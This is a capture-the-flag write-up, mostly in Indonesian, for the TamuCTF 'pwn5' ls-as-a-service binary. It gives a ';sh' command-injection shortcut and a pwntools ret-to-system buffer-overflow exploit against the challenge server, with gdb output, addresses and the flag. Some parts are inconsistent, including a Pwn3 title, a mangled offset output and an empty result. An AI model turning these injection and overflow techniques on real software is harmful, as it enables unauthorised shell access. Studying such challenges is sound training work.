# __TamuCTF__
## _Pwn3_

## Information
**Category:** | **Points**
pwn | 100

**Description**

> nc pwn.tamuctf.com 4325
> Difficulty: medium
> [pwn5](./pwn5)

### Pwn5
#### File
```
pwn5: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=f9690a5a90e54f8336b65636e719feac16798d50, not stripped
```

```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

#### Run
```
[l0l@l0l Pwn5]$ nc pwn.tamuctf.com 4325
ls as a service (laas)(Copyright pending)
Version 2: Less secret strings and more portable!
Enter the arguments you would like to pass to ls:
.
Result of ls .:
flag.txt
pwn5
ls as a service (laas)(Copyright pending)
Version 2: Less secret strings and more portable!
Enter the arguments you would like to pass to ls:
```

#### Solve
Seperti Pwn4, terdapat cara mudah untuk solve soal ini yaitu dengan payload `;sh`. Namun solusi yang sebenarnya adalah dengan ROP.

Maka coba solve dengan cara yang diinginkan. Setelah dibuka di gbd ternyata banyak sekali fungsi di program ini. Langsung saja disassemble fungsi main. Tidak banyak yang menarik, hanya memanggil fungsi laas.
```
   0x0804894d <+17>:    mov    eax,ds:0x80eb4b8
   0x08048952 <+22>:    push   0x0
   0x08048954 <+24>:    push   0x0
   0x08048956 <+26>:    push   0x2
   0x08048958 <+28>:    push   eax
   0x08048959 <+29>:    call   0x804f960 <setvbuf>
   0x0804895e <+34>:    add    esp,0x10
   0x08048961 <+37>:    call   0x80488be <laas>
   0x08048966 <+42>:    jmp    0x8048961 <main+37>
```

Disassemble fungsi `laas`

```
   0x080488f1 <+51>:    add    esp,0x10
   0x080488f4 <+54>:    sub    esp,0xc
   0x080488f7 <+57>:    lea    eax,[ebp-0xd]
   0x080488fa <+60>:    push   eax
   0x080488fb <+61>:    call   0x804f660 <gets>
   0x08048900 <+66>:    add    esp,0x10
   0x08048903 <+69>:    sub    esp,0x8
   0x08048906 <+72>:    push   0x2f
   0x08048908 <+74>:    lea    eax,[ebp-0xd]
   0x0804890b <+77>:    push   eax
   0x0804890c <+78>:    call   0x80482a0
   0x08048911 <+83>:    add    esp,0x10
   0x08048914 <+86>:    test   eax,eax
```

Vulnerability nya masih sama yaitu buffer overflow, hanya saja di sini ternyata programnya `statically linked` jadi kita tidak bisa menggunakan ret2libc. Tapi masih bisa diakali dengan ROP. Tapi `ROPgadget --binary pwn5 --ropchain` tidak bisa jalan, gatau kenapa. Akhirnya ketemu cara lain untuk mencari address system di dalam binary.
```
gdb-peda$ info address system
Symbol "system" is at 0x804ee30 in a file compiled without debugging.
```

Sedangkan untuk mencari string "/bin/sh" kita dapat menggunakan binary ninja lalu lakukan pencarian string "/bin/sh". Hasilnya ditemukan pada address 0x080bc140.

Selanjutnya kita harus mencari tahu berapa padding yang dibutuhkan karena di tengah-tengah program mengacak-acak esp.

```
set follow-fork-mode parent
pattern_create 500
pattern_offset 0x41414341
gdb-peda$ pattern_offset 0x41414341
gttern_offset 0x41414341
```

Jadi padding yang dibutuhkan 17 bytes.

#### Payload
```py
from pwn import *
r = remote('pwn.tamuctf.com', 4325)
context.arch='i386'
system = 0x804ee30
binsh = 0x80bc140
return_addr_system = 'AAAA'	# return address after executing system
payload = cyclic(17)+p32(system) +return_addr_system+ p32(binsh)
r.sendline(payload)
r.interactive()
```

#### Result
```
```

#### Flag
gigem{r37urn_0r13n73d_pr4c71c3}

#### TODO
Kerjakan dengan ROP
